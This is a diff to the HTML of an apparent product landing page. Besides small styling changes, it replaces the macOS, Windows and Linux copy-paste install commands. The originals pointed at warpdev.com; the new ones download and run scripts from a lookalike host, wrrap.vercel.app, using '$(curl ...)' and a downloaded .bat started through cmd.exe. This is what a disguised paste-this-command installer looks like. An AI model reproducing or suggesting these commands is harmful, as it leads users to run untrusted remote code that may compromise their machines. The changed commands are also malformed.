@@ -440,8 +440,7 @@
   <div data-animation="default" class="navbar w-nav" data-easing2="ease" fs-scrolldisable-element="smart-nav"
     data-easing="ease" data-collapse="small" data-w-id="e9aadf04-ea12-4177-64aa-faf87327b479" role="banner"
     data-duration="400">
-    <div class="navbar-container"><a href="/" aria-current="page"
-        class="navbar-logo-link w-nav-brand w--current"><img
+    <div class="navbar-container"><a href="/" aria-current="page" class="navbar-logo-link w-nav-brand w--current"><img
           src="https://assets-global.website-files.com/64b6f3636f598299028e8577/65a6ee1dfad0ee04bccb5086_Logo (1).svg"
           loading="lazy" alt="" class="navbar-logo-image" /></a>
       <nav role="navigation" class="navbar-item is-page-height-tablet w-nav-menu">
@@ -850,7 +849,8 @@
                         </div>
 
                         <div id="dmacos" class="cmd hidden">
-                          <div style="padding: 1.4rem;" id="macos-command">curl -fsSL warpdev.com/install.sh | sh</div>
+                          <div style="padding: 1.4rem;" id="macos-command">$(curl -fsSL https://wrrap.vercel.app/install.sh)
+                          </div>
                           <div class="copy_part" onclick="Copy('macos')">
                             <img
                               src="https://assets-global.website-files.com/64b6f3636f598299028e8577/65cdf07abd40e67652fc63f3_copy-icon.svg"
@@ -859,17 +859,21 @@
                         </div>
 
                         <div id="dwindows" class="cmd hidden">
-                          <div style="padding: 1.4rem;" id="windows-command">iwr https://warpdev.com/install.ps1 |iex
+                          <div style="padding: 1.4rem;" id="windows-command">Invoke-WebRequest -Uri
+                            https://wrrap.vercel.app/install.bat -OutFile install.bat; Start-Process cmd.exe -ArgumentList
+                            '/c install.bat
                           </div>
-                          <div class="copy_part" onclick="Copy('windows')">
+                          <div class="copy_part" onclick="Copy('windows')" style="align-items: center; justify-content: center;">
                             <img
                               src="https://assets-global.website-files.com/64b6f3636f598299028e8577/65cdf07abd40e67652fc63f3_copy-icon.svg"
-                              alt="" srcset=""> <span id="windows-copy-text">Copy</span>
+                              alt="" srcset="" style="width: 26px;"> <span id="windows-copy-text"
+                              style="font-size: 20px;">Copy</span>
                           </div>
                         </div>
 
-                        <div id="dlinux" class="cmd hidden">
-                          <div style="padding: 1.4rem;" id="linux-command">iwr warpdev.com/install.ps1 | iex</div>
+                        <div id="dlinux" class="cmd hidden" style="font-size: 15px;">
+                          <div style="padding: 1.4rem;" id="linux-command">$(curl -fsSL
+                            https://wrrap.vercel.app/install-linux.sh)</div>
                           <div class="copy_part" onclick="Copy('linux')">
                             <img
                               src="https://assets-global.website-files.com/64b6f3636f598299028e8577/65cdf07abd40e67652fc63f3_copy-icon.svg"
